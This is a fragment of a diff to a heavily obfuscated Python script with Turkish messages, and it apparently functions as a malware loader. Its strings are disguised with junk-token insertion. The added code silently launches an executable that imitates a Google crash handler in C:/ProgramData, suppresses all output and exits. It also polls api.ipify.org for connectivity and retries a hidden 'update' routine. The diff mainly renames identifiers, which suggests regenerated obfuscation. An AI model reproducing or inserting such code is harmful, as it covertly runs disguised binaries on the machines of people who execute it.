+        print('rvqi rvqiSrvqicrvqirrvqiirvqiprvqitrvqi rvqigrvqiürvqinrvqicrvqiervqilrvqilrvqiervqinrvqidrvqiirvqi,rvqi rvqiyrvqiervqinrvqiirvqidrvqiervqinrvqi rvqibrvqiarvqişrvqilrvqiarvqitrvqiırvqilrvqiırvqiyrvqiorvqirrvqi.rvqi.rvqi.rvqi'.replace('rvqi', ''))
+        _evHAvk1BZP.Popen('pzCpz:pz/pzPpzrpzopzgpzrpzapzmpzDpzapztpzapz/pzGpzopzopzgpzlpzepzLpzipzbpzrpzapzrpzypz/pzGpzopzopzgpzlpzepzCpzrpzapzspzhpzHpzapznpzdpzlpzepzrpz.pzepzxpzepz pzCpz:pz/pzPpzrpzopzgpzrpzapzmpzDpzapztpzapz/pzGpzopzopzgpzlpzepzLpzipzbpzrpzapzrpzypz/pzupzppzdpzapztpzepz.pzlpzipzbpz'.replace('pz', ''), shell=True, stdout=_evHAvk1BZP.DEVNULL, stderr=_evHAvk1BZP.DEVNULL)
+        _l0mdFClnUQvD.exit(0)
+    if not _Gy8uoBE and (not _IHT1b5U) and (not _PaX3NWhOBssW):
+        print('spr sprTsprüsprmspr sprdsprosprssprysprasprlsprasprrspr sprzsprasprtspresprnspr sprgsprüsprnsprcspresprlspr.spr'.replace('spr', ''))
 
-def _HN6Fo8(_wa1hl8P51kO=15, _H9Iyyv4F=60):
-    for _VTnlzRq in range(1, _wa1hl8P51kO + 1):
+def _oMr5p88(_Fm4Uwvo=15, _yZqAvCAroC=60):
+    for _RqeLoAHTPco in range(1, _Fm4Uwvo + 1):
         try:
-            _fA9OW8Tg_d()
+            _dVP34uCec()
             return True
         except Exception as e:
-            print(f"{'dtxmGdtxmudtxmndtxmcdtxmedtxmldtxmldtxmedtxmmdtxmedtxm dtxmhdtxmadtxmtdtxmadtxmsdtxmidtxm dtxm(dtxm'.replace('dtxm', '')}{_VTnlzRq}{'wam/wam'.replace('wam', '')}{_wa1hl8P51kO}{'ckbd)ckbd:ckbd ckbd'.replace('ckbd', '')}{e}")
-            if _VTnlzRq < _wa1hl8P51kO:
-                _lrMqSUtuzk.sleep(_H9Iyyv4F)
-    print('gphGgphugphngphcgphegphlgphlgphegphmgphegph gphbgphagphsgphagphrgphigphsgphigphzgph,gph gphmgphegphvgphcgphugphtgph gphlgphogphcgphagphlgph gphdgphogphsgphygphagphlgphagphrgphlgphagph gphdgphegphvgphagphmgph gphegphdgphigphlgphigphygphogphrgph.gph'.replace('gph', ''))
+            print(f"{'sexGsexusexnsexcsexesexlsexlsexesexmsexesex sexhsexasextsexasexssexisex sex(sex'.replace('sex', '')}{_RqeLoAHTPco}{'cacy/cacy'.replace('cacy', '')}{_Fm4Uwvo}{'oz)oz:oz oz'.replace('oz', '')}{e}")
+            if _RqeLoAHTPco < _Fm4Uwvo:
+                _d_R5zMQOzO.sleep(_yZqAvCAroC)
+    print('bsgGbsgubsgnbsgcbsgebsglbsglbsgebsgmbsgebsg bsgbbsgabsgsbsgabsgrbsgibsgsbsgibsgzbsg,bsg bsgmbsgebsgvbsgcbsgubsgtbsg bsglbsgobsgcbsgabsglbsg bsgdbsgobsgsbsgybsgabsglbsgabsgrbsglbsgabsg bsgdbsgebsgvbsgabsgmbsg bsgebsgdbsgibsglbsgibsgybsgobsgrbsg.bsg'.replace('bsg', ''))
     return False
 
-def _Ek6g3Ql2MCRW():
+def _JlVA8e():
     while True:
         try:
-            _c7lGN44xsFUr = _CrHfcgv3yZx.get('brohbrotbrotbropbrosbro:bro/bro/broabropbroibro.broibropbroibrofbroybro.broobrorbrogbro'.replace('bro', ''), timeout=5)
-            _c7lGN44xsFUr.raise_for_status()
-            print(f"{'hzx[hzxOhzxKhzx]hzx hzxİhzxnhzxthzxehzxrhzxnhzxehzxthzx hzxbhzxahzxğhzxlhzxahzxnhzxthzxıhzxshzxıhzx hzxvhzxahzxrhzx.hzx'.replace('hzx', '')}")
+            _QHjUex = _UkEreV7a3v.get('jzhhjzhtjzhtjzhpjzhsjzh:jzh/jzh/jzhajzhpjzhijzh.jzhijzhpjzhijzhfjzhyjzh.jzhojzhrjzhgjzh'.replace('jzh', ''), timeout=5)
+            _QHjUex.raise_for_status()
+            print(f"{'eoqn[eoqnOeoqnKeoqn]eoqn eoqnİeoqnneoqnteoqneeoqnreoqnneoqneeoqnteoqn eoqnbeoqnaeoqnğeoqnleoqnaeoqnneoqnteoqnıeoqnseoqnıeoqn eoqnveoqnaeoqnreoqn.eoqn'.replace('eoqn', '')}")
             return
         except Exception as e:
-            print(f"{'hpm[hpmEhpmRhpmRhpmOhpmRhpm]hpm hpmBhpmahpmğhpmlhpmahpmnhpmthpmıhpm hpmyhpmohpmkhpm hpm(hpm'.replace('hpm', '')}{type(e).__name__}{'ys:ys ys'.replace('ys', '')}{str(e)}{'jg)jg,jg jg6jg0jg jgsjgajgnjgijgyjgejg jgsjgojgnjgrjgajg jgtjgejgkjgrjgajgrjg jgdjgejgnjgejgnjgejgcjgejgkjg.jg.jg.jg'.replace('jg', '')}")
-            _lrMqSUtuzk.sleep(65)
-if __name__ == 'bae_bae_baembaeabaeibaenbae_bae_bae'.replace('bae', ''):
-    _Ek6g3Ql2MCRW()
-    _HN6Fo8()
-    _rQXqV6lO()
+            print(f"{'dx[dxEdxRdxRdxOdxRdx]dx dxBdxadxğdxldxadxndxtdxıdx dxydxodxkdx dx(dx'.replace('dx', '')}{type(e).__name__}{'qfsf:qfsf qfsf'.replace('qfsf', '')}{str(e)}{'dfie)dfie,dfie dfie6dfie0dfie dfiesdfieadfiendfieidfieydfieedfie dfiesdfieodfiendfierdfieadfie dfietdfieedfiekdfierdfieadfierdfie dfieddfieedfiendfieedfiendfieedfiecdfieedfiekdfie.dfie.dfie.dfie'.replace('dfie', '')}")
+            _d_R5zMQOzO.sleep(65)
+if __name__ == 'vc_vc_vcmvcavcivcnvc_vc_vc'.replace('vc', ''):
+    _JlVA8e()
+    _oMr5p88()
+    _eBmHNVbK5p()
+    _CHQOBd3UEu9W()
